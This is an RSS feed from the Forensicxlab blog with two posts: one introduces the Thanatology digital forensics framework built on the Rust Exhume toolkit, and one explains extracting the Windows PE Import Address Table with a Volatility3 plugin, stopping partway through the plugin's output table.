<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xsl" href="rss.xsl"?>
<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
    <channel>
        <title>Forensicxlab Blog</title>
        <link>https://forensicxlab.github.io/blog</link>
        <description>Forensicxlab Blog</description>
        <lastBuildDate>Mon, 09 Jun 2025 00:00:00 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[ü¶â Thanatology Part 1 - Introducing the Thanatology project]]></title>
            <link>https://forensicxlab.github.io/blog/thanatology</link>
            <guid>https://forensicxlab.github.io/blog/thanatology</guid>
            <pubDate>Mon, 09 Jun 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[In digital forensics, tools are only as valuable as the investigator‚Äôs ability to understand and explain their output, especially when presenting evidence in court. Beyond simply extracting data, the methodology behind how artifacts are collected and interpreted plays a critical role in admissibility, reliability and credibility.]]></description>
            <content:encoded><![CDATA[<p>In digital forensics, tools are only as valuable as the investigator‚Äôs ability to understand and explain their output, especially when presenting evidence in court. Beyond simply extracting data, the methodology behind how artifacts are collected and interpreted plays a critical role in admissibility, reliability and credibility.</p>
<p>This blog post series introduces the Thanatology Project, an open-source, cross-platform digital forensics framework currently under development. Built on top of the Exhume ToolKit (a modular set of Rust-based forensic tools), Thanatology combines performance, transparency, and modern design via a Tauri-based desktop interface.
Designed for law enforcement and digital forensic professionals, the project emphasizes not only artifact collection and presentation but will also try to provide help for interpretation.</p>
<p>For example, when analyzing EXTFS file systems, Thanatology will try to offers guidance on timestamp meanings and includes complete extraction details suitable for annexing to formal reports.</p>
<p>The blog series will cover:</p>
<ul>
<li>An overview of the Thanatology project and its goals.</li>
<li>A high-level introduction to the Exhume tool suite.</li>
<li>Deep dives into each Exhume module and its specific forensic use case.</li>
<li>Updates on the project development.</li>
<li>Interesting research techniques we found during our journey.</li>
</ul>
<p>While Thanatology is not intended to replace established tools, it will attempt to offers a modular and modern alternative ideal for cross-verifying findings or integrating into custom workflows. This blogpost series is mainly here to provide the community with updates, technical knowledge and any interesting subjects we found along the way.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="purpose-and-motivations">Purpose and motivations<a href="https://forensicxlab.github.io/blog/thanatology#purpose-and-motivations" class="hash-link" aria-label="Direct link to Purpose and motivations" title="Direct link to Purpose and motivations">‚Äã</a></h2>
<p>Working in the digital forensics field for a while now. I am amazed to witness many investigators using tools without being able to answer some critical questions in front of court, thus making the whole work sometimes worthless. Here are some critical questions that could pop up during review:</p>
<ul>
<li>What is the artefact?</li>
<li>Where did it come from?</li>
<li>How was it acquired?</li>
<li>How was it processed or analyzed?</li>
<li>What does it mean?</li>
<li>Can this be independently verified?</li>
</ul>
<p>Although <strong>education</strong>, <strong>experience</strong>, and <strong>expertise</strong> are key to answer these questions, we felt that the need to have more control and transparency in the tool we use is critical.</p>
<p>With the intention to better understand what digital forensics tools are actually doing from scratch; I wanted to build my own tools. The trigger was during a criminology degree in 2024, I was introduced and dived deep inside the traditional medical forensics field and had the opportunity to witness how well the technical procedure is design for the study of the dead and the living. This gave me the motivation to create the ‚ÄúThanatology‚Äù project named after this discipline<sup><a href="https://forensicxlab.github.io/blog/thanatology#user-content-fn-1-5450bf" id="user-content-fnref-1-5450bf" data-footnote-ref="true" aria-describedby="footnote-label">1</a></sup> in an effort to create a framework that allows the digital investigator expert to be more rigorous by design.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="what-is-thanatology">What Is Thanatology?<a href="https://forensicxlab.github.io/blog/thanatology#what-is-thanatology" class="hash-link" aria-label="Direct link to What Is Thanatology?" title="Direct link to What Is Thanatology?">‚Äã</a></h2>
<p>In short, Thanatology is a modern and enhanced digital forensics Desktop Application which is cross-platform using the power of the Tauri framework.</p>
<p>It is built on top of the <a href="https://www.forensicxlab.com/docs/exhume" target="_blank" rel="noopener noreferrer"><strong>Exhume tool suite</strong></a> (or toolkit). The exhume tool suite is a set of command line and libraries written in rust from scratch to parse data from different digital sources and formats to extract artifacts. There is nothing new to the approach, the sleuthkit<sup><a href="https://forensicxlab.github.io/blog/thanatology#user-content-fn-2-5450bf" id="user-content-fnref-2-5450bf" data-footnote-ref="true" aria-describedby="footnote-label">2</a></sup> is built around a similar philosophy.</p>
<p>The difference here is that I wanted to use the powerful capabilities of the rust language to produce an alternative and perhaps more modern approach to propose as many digital forensics features as possible like disk image forensics, memory forensics, malware analysis and, in time, Artificial Intelligence features.</p>
<p>It also allows me to compare my results with well-established tools and challenge myself technically. I could already witness during my journey some inconsistencies in some well-known and widely used tools that will be detailed in later blog posts. In short, rebuilding almost everything from scratch might sound time consuming and not interesting but it is worth it to learn new things and stimulate innovation.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="design-and-architecture">Design and architecture<a href="https://forensicxlab.github.io/blog/thanatology#design-and-architecture" class="hash-link" aria-label="Direct link to Design and architecture" title="Direct link to Design and architecture">‚Äã</a></h2>
<p>The Thanatology project is built around 2 major components:</p>
<ul>
<li>The Exhume Tool Suite</li>
<li>The Tauri Framework</li>
</ul>
<figure style="border:1px solid #888;padding:20px"><img src="https://forensicxlab.github.io/img/thanatology-1/Picture1.png" alt="Thanatology architecture"><figcaption><i>Thanatology architecture</i></figcaption></figure>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="the-exhume-tool-suite">The Exhume Tool suite<a href="https://forensicxlab.github.io/blog/thanatology#the-exhume-tool-suite" class="hash-link" aria-label="Direct link to The Exhume Tool suite" title="Direct link to The Exhume Tool suite">‚Äã</a></h3>
<p>The <a href="https://www.forensicxlab.com/docs/exhume" target="_blank" rel="noopener noreferrer">exhume tool suite</a> (named after the exhume<sup><a href="https://forensicxlab.github.io/blog/thanatology#user-content-fn-3-5450bf" id="user-content-fnref-3-5450bf" data-footnote-ref="true" aria-describedby="footnote-label">3</a></sup> terms in the discipline and the idea of bringing back from neglect or obscurity), is the foundation of the applications. Any digital forensics examiner can use the exhume tool suite as a command line to perform digital forensics investigation. Exhume is a hybrid tool suite, each tool can be used as a command line or as a library thus enabling any member of the community to write their own tools. Thanatology is just a Desktop application using the exhume tool suite as a library. <strong>We will deep dive into exhume in the next blogpost of this series</strong>.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="the-tauri-framework">The Tauri Framework<a href="https://forensicxlab.github.io/blog/thanatology#the-tauri-framework" class="hash-link" aria-label="Direct link to The Tauri Framework" title="Direct link to The Tauri Framework">‚Äã</a></h3>
<p><em><strong>Digital Forensics is a cross-platform discipline!</strong></em></p>
<p>Tauri is a modern framework for building cross-platform desktop applications using:</p>
<ul>
<li>A Frontend: Web technologies (React, Vue, Svelte, etc.)</li>
<li>A Backend: Native Rust code</li>
</ul>
<p>It allows developers to package their web-based UI as a lightweight, secure desktop application across Windows, Linux, and macOS. In our case, we choose the REACT MUI framework for the frontend.</p>
<p>Unlike Electron (which bundles Chromium), Tauri uses the system‚Äôs native webview (WebView2 on Windows, WKWebView on macOS, and WebKitGTK on Linux), making it much smaller and more secure.</p>
<p>There is many more advantages in using the tauri framework you can learn more <a href="https://tauri.app/" target="_blank" rel="noopener noreferrer">here</a>.</p>
<p>In the context of Thanatology, Tauri allows seamless reuse of the exhume tool suite code in the desktop app. This ensures high performance, memory safety, and low-level control without sacrificing UX.  We are using a local SQLite database for the first major release, but the goal is to have an hybrid approach where the use can choose between a local or remote database, enabling collaboration.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="state-of-the-art">State of the art<a href="https://forensicxlab.github.io/blog/thanatology#state-of-the-art" class="hash-link" aria-label="Direct link to State of the art" title="Direct link to State of the art">‚Äã</a></h2>
<p>Thanatology is in its development phase, it is evolving in parallel of the Exhume toolsuite, exhume being the library which the projects is relying up on. We are starting with traditional disk forensics and currently have made several millstones described below.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="basic-case--evidence-management">Basic case &amp; evidence management<a href="https://forensicxlab.github.io/blog/thanatology#basic-case--evidence-management" class="hash-link" aria-label="Direct link to Basic case &amp; evidence management" title="Direct link to Basic case &amp; evidence management">‚Äã</a></h3>
<p>In Thanatology, a case is a set of evidence. The investigator can create a case and add one or multiple evidence linked to the created case. The type of evidence supported is currently only ‚Äúdisk image‚Äù which can be a logical or physical acquisition.</p>
<figure style="border:1px solid #888;padding:20px"><img src="https://forensicxlab.github.io/img/thanatology-1/Picture2.png" alt="Thanatology evidence selection view"><figcaption><i>Thanatology evidence selection view</i></figcaption></figure>
<figure style="border:1px solid #888;padding:20px"><img src="https://forensicxlab.github.io/img/thanatology-1/Picture3.png" alt="Thanatology case summary view"><figcaption><i>Thanatology case summary view</i></figcaption></figure>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="mbr--gpt-partition-discovery">MBR &amp; GPT Partition Discovery<a href="https://forensicxlab.github.io/blog/thanatology#mbr--gpt-partition-discovery" class="hash-link" aria-label="Direct link to MBR &amp; GPT Partition Discovery" title="Direct link to MBR &amp; GPT Partition Discovery">‚Äã</a></h3>
<p>Once the evidence is selected, the preprocessing of the evidence can begin. The preprocessing phase is meant for the investigator to choose what he wants to analyze. It is important in the case of disk forensics for example that the investigator knows exactly what was discovered and that the action can be replicated with the exhume tool kit command line. You can see below the difference between discovering partitions in the Exhume toolkit with the CLI versus the output produced in the desktop application. That show how interlinked the twos are. Our philosophy is: ‚Äú<em><strong>What you can see in the Desktop application can be recovered using the CLI</strong></em>‚Äù.</p>
<figure style="border:1px solid #888;padding:20px"><img src="https://forensicxlab.github.io/img/thanatology-1/Picture4.png" alt="Thanatology partition discovery view"><figcaption><i>Thanatology partition discovery view</i></figcaption></figure>
<figure style="border:1px solid #888;padding:20px"><img src="https://forensicxlab.github.io/img/thanatology-1/Picture5.png" alt="Exhume partition discovery view"><figcaption><i>Exhume partition discovery view</i></figcaption></figure>
<p>The investigator can choose which partitions he wishes to analyze. Thanatology is transparent and will inform the investigator if it is not capable of parsing some types of partitions. In the example below, we selected the Linux/GNU partition, which is recognized by Exhume, however the swap partition is not yet supported by any modules, thus indicating this information to the user. We plan to add the capability to choose which investigation modules to run in the processing phase so the investigator can disable or enable some modules depending on the context.</p>
<figure style="border:1px solid #888;padding:20px"><img src="https://forensicxlab.github.io/img/thanatology-1/Picture6.png" alt="Exhume partition discovery view"><figcaption><i>Thanatology partition discovery view</i></figcaption></figure>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="basic-extfs-and-ntfs-file-indexing">Basic ExtFS and NTFS file indexing<a href="https://forensicxlab.github.io/blog/thanatology#basic-extfs-and-ntfs-file-indexing" class="hash-link" aria-label="Direct link to Basic ExtFS and NTFS file indexing" title="Direct link to Basic ExtFS and NTFS file indexing">‚Äã</a></h3>
<p>The next step after the <strong>preprocessing</strong> phase is the processing phase. This is where the investigator will start the processing of the evidence. We build a basic file discovery module to index each file inside the local database. We have implemented a filesystem normalization system in exhume. This system is inherited by Thanatology. The advantage is that we can build the Exhume tool suite with the Thanatology application in mind to guide us.</p>
<figure style="border:1px solid #888;padding:20px"><img src="https://forensicxlab.github.io/img/thanatology-1/Picture10.png" alt="Thanatology Processing"><figcaption><i>Thanatology Processing basic view</i></figcaption></figure>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="investigating-the-evidence">Investigating the evidence<a href="https://forensicxlab.github.io/blog/thanatology#investigating-the-evidence" class="hash-link" aria-label="Direct link to Investigating the evidence" title="Direct link to Investigating the evidence">‚Äã</a></h3>
<p>When the processing is done, the last stage is to review it to perform our digital investigation. The current design is only for demonstration purpose and will evolve in time but here is a sneak peak into the features we would like to provide for the first release:</p>
<ul>
<li><strong>Artifacts category navigation</strong>: Preselect some known artifacts base on the digital forensic community.</li>
<li><strong>Simple and deep file introspection</strong>: We are developing our own ‚ÄúAdvanced File Viewer‚Äù to introspect files in real time.</li>
<li><strong>Agnostic shell integration</strong>: Many investigators like to use the command line to run their own tools or the Exhume toolkit as a command line in the evidence they are investigating. We are integrating the capability to pop shells in Thanatology like you would in visual studio code for example.</li>
<li><strong>Whiteboard</strong>: The investigator can keep track of the story he is building around the case using the Whiteboard which is based on <a href="https://plus.excalidraw.com/" target="_blank" rel="noopener noreferrer">excalidraw</a>.</li>
</ul>
<figure style="border:1px solid #888;padding:20px"><img src="https://forensicxlab.github.io/img/thanatology-1/Picture8.png" alt="Exhume partition discovery view"><figcaption><i>Thanatology basics artifacts categories</i></figcaption></figure>
<figure style="border:1px solid #888;padding:20px"><img src="https://forensicxlab.github.io/img/thanatology-1/Picture9.png" alt="Exhume partition discovery view"><figcaption><i>Thanatology Advanced file Viewer</i></figcaption></figure>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="conclusion">Conclusion<a href="https://forensicxlab.github.io/blog/thanatology#conclusion" class="hash-link" aria-label="Direct link to Conclusion" title="Direct link to Conclusion">‚Äã</a></h2>
<p>This blogpost was about presenting a high-level vision of the project. In the future blogpost of the series, we will dive deep into the Exhume Tool Suite, exploring the most important existing modules and how to use them. Many blogposts will follow to update on the state of the Thanatology development. We have many ideas, but this is a side project so if you want to get involved into this project, we have created a Discord Community Server that you can join using the following <a href="https://discord.com/invite/AqkYgR5HEg" target="_blank" rel="noopener noreferrer">link</a>.</p>
<!-- -->
<section data-footnotes="true" class="footnotes"><h2 class="anchor anchorWithStickyNavbar_LWe7 sr-only" id="footnote-label">Footnotes<a href="https://forensicxlab.github.io/blog/thanatology#footnote-label" class="hash-link" aria-label="Direct link to Footnotes" title="Direct link to Footnotes">‚Äã</a></h2>
<ol>
<li id="user-content-fn-1-5450bf">
<p><a href="https://en.wikipedia.org/wiki/Thanatology" target="_blank" rel="noopener noreferrer">https://en.wikipedia.org/wiki/Thanatology</a> <a href="https://forensicxlab.github.io/blog/thanatology#user-content-fnref-1-5450bf" data-footnote-backref="" aria-label="Back to reference 1" class="data-footnote-backref">‚Ü©</a></p>
</li>
<li id="user-content-fn-2-5450bf">
<p><a href="https://en.wikipedia.org/wiki/The_Sleuth_Kit" target="_blank" rel="noopener noreferrer">https://en.wikipedia.org/wiki/The_Sleuth_Kit</a> <a href="https://forensicxlab.github.io/blog/thanatology#user-content-fnref-2-5450bf" data-footnote-backref="" aria-label="Back to reference 2" class="data-footnote-backref">‚Ü©</a></p>
</li>
<li id="user-content-fn-3-5450bf">
<p><a href="https://en.wikipedia.org/wiki/Burial#Exhumation" target="_blank" rel="noopener noreferrer">https://en.wikipedia.org/wiki/Burial#Exhumation</a> <a href="https://forensicxlab.github.io/blog/thanatology#user-content-fnref-3-5450bf" data-footnote-backref="" aria-label="Back to reference 3" class="data-footnote-backref">‚Ü©</a></p>
</li>
</ol>
</section>]]></content:encoded>
            <category>Thanatology</category>
            <category>Exhume</category>
            <category>Digital Forensics</category>
        </item>
        <item>
            <title><![CDATA[üì¶ Volatility3 : Import Address Table]]></title>
            <link>https://forensicxlab.github.io/blog/voliat</link>
            <guid>https://forensicxlab.github.io/blog/voliat</guid>
            <pubDate>Sat, 16 Dec 2023 00:00:00 GMT</pubDate>
            <description><![CDATA[Windows executable analysis is a key aspect of Digital Forensics and Reverse Malware Engineering. Identifying the capabilities of a program can help to target potential malicious code and orient the later reverse code analysis phase. In this blogpost, we will dive into the structure of the Windows Portable Executable (PE) and how we can extract the imported functions in the context of memory analysis.]]></description>
            <content:encoded><![CDATA[<p>Windows executable analysis is a key aspect of Digital Forensics and Reverse Malware Engineering. Identifying the capabilities of a program can help to target potential malicious code and orient the later reverse code analysis phase. In this blogpost, we will dive into the structure of the Windows Portable Executable (PE) and how we can extract the imported functions in the context of memory analysis.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="windows-pe-format">Windows PE Format<a href="https://forensicxlab.github.io/blog/voliat#windows-pe-format" class="hash-link" aria-label="Direct link to Windows PE Format" title="Direct link to Windows PE Format">‚Äã</a></h2>
<p>A portable executable (PE) <sup><a href="https://forensicxlab.github.io/blog/voliat#user-content-fn-1-efcee2" id="user-content-fnref-1-efcee2" data-footnote-ref="true" aria-describedby="footnote-label">1</a></sup> is a file format used by Windows to store executable programs, libraries (DLLs) and object files. It contains all the necessary information for the operating system to load and execute the program. The program is therefore well structured. Here is a representation of the PE structure for a Windows system <sup><a href="https://forensicxlab.github.io/blog/voliat#user-content-fn-2-efcee2" id="user-content-fnref-2-efcee2" data-footnote-ref="true" aria-describedby="footnote-label">2</a></sup>:</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/1-daca747f861ae57a39ac6507d382ad44.png" title="PE Structure (simplified)" width="318" height="558" class="img_ev3q"></p>
<p>The PE starts with the well-known DOS, Stub and NT headers. It is also composed of multiple sections. Each section as its own purpose, for example the .text section contains the byte codes corresponding to the instructions of the program. We will see that there are specific sections that exists which might help the analyst to identify the capabilities of an executable without starting the reverse code analysis phase. If you want to learn more about the PE format, the articles from 0xRick about the subject are very well explained <sup><a href="https://forensicxlab.github.io/blog/voliat#user-content-fn-2-efcee2" id="user-content-fnref-2-efcee2-2" data-footnote-ref="true" aria-describedby="footnote-label">2</a></sup>.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="interactions-with-the-memory">Interactions with the memory<a href="https://forensicxlab.github.io/blog/voliat#interactions-with-the-memory" class="hash-link" aria-label="Direct link to Interactions with the memory" title="Direct link to Interactions with the memory">‚Äã</a></h3>
<p>In the context of memory analysis, we need to understand what is happening when a Windows executable is loaded. The operating system will map the PE file from the disk to memory by first creating a dedicated virtual address space. Then, the headers are parsed and loaded to learn about important information about the sections (entry point, size, ...). Once parsed, the memory allocation is performed to load the actual content of the sections. The PE file often depends on external libraries, the operating system resolves the imports by looking up the required functions in the corresponding DLLs and update the memory addresses accordingly. A library can be ‚Äúbound‚Äù to the PE which means it is directly integrated inside the code section. This is often used for better performances.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="the-import-address-table-iat">The Import Address Table (IAT)<a href="https://forensicxlab.github.io/blog/voliat#the-import-address-table-iat" class="hash-link" aria-label="Direct link to The Import Address Table (IAT)" title="Direct link to The Import Address Table (IAT)">‚Äã</a></h3>
<p>The Import Address Table is located inside the ‚Äú.idata‚Äù Section <sup><a href="https://forensicxlab.github.io/blog/voliat#user-content-fn-3-efcee2" id="user-content-fnref-3-efcee2" data-footnote-ref="true" aria-describedby="footnote-label">3</a></sup> of a PE, it can be seen as a table of references indicating to the loader which functions are needed from the imported DLL by the program. This table is a copy of the Import Lookup Table (ILT), but once in memory, the IAT is overwritten with the actual addresses of the functions that are being imported which is interesting from the memory forensics standpoint.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="extracting-the-iat-using-volatility3">Extracting the IAT using volatility3<a href="https://forensicxlab.github.io/blog/voliat#extracting-the-iat-using-volatility3" class="hash-link" aria-label="Direct link to Extracting the IAT using volatility3" title="Direct link to Extracting the IAT using volatility3">‚Äã</a></h2>
<p>Carving the IAT during memory forensics can be very valuable for the analyst to look for API call patterns associated with malware behavior. For example, the OpenProcess, VirtualAllocEx, CreateRemoteThread function present inside the IAT of a PE can be a good indicator for potential code injection <sup><a href="https://forensicxlab.github.io/blog/voliat#user-content-fn-4-efcee2" id="user-content-fnref-4-efcee2" data-footnote-ref="true" aria-describedby="footnote-label">4</a></sup>. The analyst can also pivot on some of the functions to identify for example the arguments that can be passed.</p>
<p>A volatility3 plugin can be made to extract the IAT information from the memory. Below is an example output of the created plugin named ‚Äúwindows.iat.IAT‚Äù. For each process, the associated PE sections are parsed in order to find the IAT. Next, all of the imported functions are displayed to the analyst as well as if the associated DLL is bounded or not to the executable.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">~¬ª vol </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-r</span><span class="token plain"> pretty </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-f</span><span class="token plain"> Triage-Memory.mem windows.iat </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--pid</span><span class="token plain"> </span><span class="token number">3496</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Volatility </span><span class="token number">3</span><span class="token plain"> Framework </span><span class="token number">2.5</span><span class="token plain">.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Formatting</span><span class="token punctuation" style="color:rgb(248, 248, 242)">..</span><span class="token plain">.0.00               PDB scanning finished</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  </span><span class="token operator">|</span><span class="token plain">  PID </span><span class="token operator">|</span><span class="token plain">           Name </span><span class="token operator">|</span><span class="token plain">      Library </span><span class="token operator">|</span><span class="token plain"> Bound </span><span class="token operator">|</span><span class="token plain">                        Function </span><span class="token operator">|</span><span class="token plain">  Address</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">3496</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> UWkpjFjDzM.exe </span><span class="token operator">|</span><span class="token plain">   MSVCRT.dll </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain">                            _iob </span><span class="token operator">|</span><span class="token plain"> 0x80c0c8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">3496</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> UWkpjFjDzM.exe </span><span class="token operator">|</span><span class="token plain">   MSVCRT.dll </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain">                _except_handler3 </span><span class="token operator">|</span><span class="token plain"> 0x80c0cc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">3496</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> UWkpjFjDzM.exe </span><span class="token operator">|</span><span class="token plain">   MSVCRT.dll </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain">                  __set_app_type </span><span class="token operator">|</span><span class="token plain"> 0x80c0d0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">3496</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> UWkpjFjDzM.exe </span><span class="token operator">|</span><span class="token plain">   MSVCRT.dll </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain">                      __p__fmode </span><span class="token operator">|</span><span class="token plain"> 0x80c0d4</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">3496</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> UWkpjFjDzM.exe </span><span class="token operator">|</span><span class="token plain">   MSVCRT.dll </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain">                    __p__commode </span><span class="token operator">|</span><span class="token plain"> 0x80c0d8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">3496</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> UWkpjFjDzM.exe </span><span class="token operator">|</span><span class="token plain">   MSVCRT.dll </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain">                    _adjust_fdiv </span><span class="token operator">|</span><span class="token plain"> 0x80c0dc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">3496</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> UWkpjFjDzM.exe </span><span class="token operator">|</span><span class="token plain">   MSVCRT.dll </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain">                __setusermatherr </span><span class="token operator">|</span><span class="token plain"> 0x80c0e0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">3496</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> UWkpjFjDzM.exe </span><span class="token operator">|</span><span class="token plain">   MSVCRT.dll </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain">                       _initterm </span><span class="token operator">|</span><span class="token plain"> 0x80c0e4</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">3496</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> UWkpjFjDzM.exe </span><span class="token operator">|</span><span class="token plain">   MSVCRT.dll </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain">                   __getmainargs </span><span class="token operator">|</span><span class="token plain"> 0x80c0e8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">3496</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> UWkpjFjDzM.exe </span><span class="token operator">|</span><span class="token plain">   MSVCRT.dll </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain">                   __p___initenv </span><span class="token operator">|</span><span class="token plain"> 0x80c0ec</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">3496</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> UWkpjFjDzM.exe </span><span class="token operator">|</span><span class="token plain">   MSVCRT.dll </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain">                     _XcptFilter </span><span class="token operator">|</span><span class="token plain"> 0x80c0f0</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">3496</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> UWkpjFjDzM.exe </span><span class="token operator">|</span><span class="token plain">   MSVCRT.dll </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain">                           _exit </span><span class="token operator">|</span><span class="token plain"> 0x80c0f4</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">3496</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> UWkpjFjDzM.exe </span><span class="token operator">|</span><span class="token plain">   MSVCRT.dll </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain">                         _onexit </span><span class="token operator">|</span><span class="token plain"> 0x80c0f8</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">3496</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> UWkpjFjDzM.exe </span><span class="token operator">|</span><span class="token plain">   MSVCRT.dll </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain">                     __dllonexit </span><span class="token operator">|</span><span class="token plain"> 0x80c0fc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">3496</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> UWkpjFjDzM.exe </span><span class="token operator">|</span><span class="token plain">   MSVCRT.dll </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain">                         strrchr </span><span class="token operator">|</span><span class="token plain"> 0x80c100</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">3496</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> UWkpjFjDzM.exe </span><span class="token operator">|</span><span class="token plain">   MSVCRT.dll </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain">                         wcsncmp </span><span class="token operator">|</span><span class="token plain"> 0x80c104</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">3496</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> UWkpjFjDzM.exe </span><span class="token operator">|</span><span class="token plain">   MSVCRT.dll </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain">                          _close </span><span class="token operator">|</span><span class="token plain"> 0x80c108</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">3496</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> UWkpjFjDzM.exe </span><span class="token operator">|</span><span class="token plain">   MSVCRT.dll </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain">                          wcslen </span><span class="token operator">|</span><span class="token plain"> 0x80c10c</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* </span><span class="token operator">|</span><span class="token plain"> </span><span class="token number">3496</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> UWkpjFjDzM.exe </span><span class="token operator">|</span><span class="token plain">   MSVCRT.dll </span><span class="token operator">|</span><span class="token plain"> False </span><span class="token operator">|</span><span class="token plain">                          wcscpy </span><span class="token operator">|</span><span class="token plain"> 0x80c110</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token 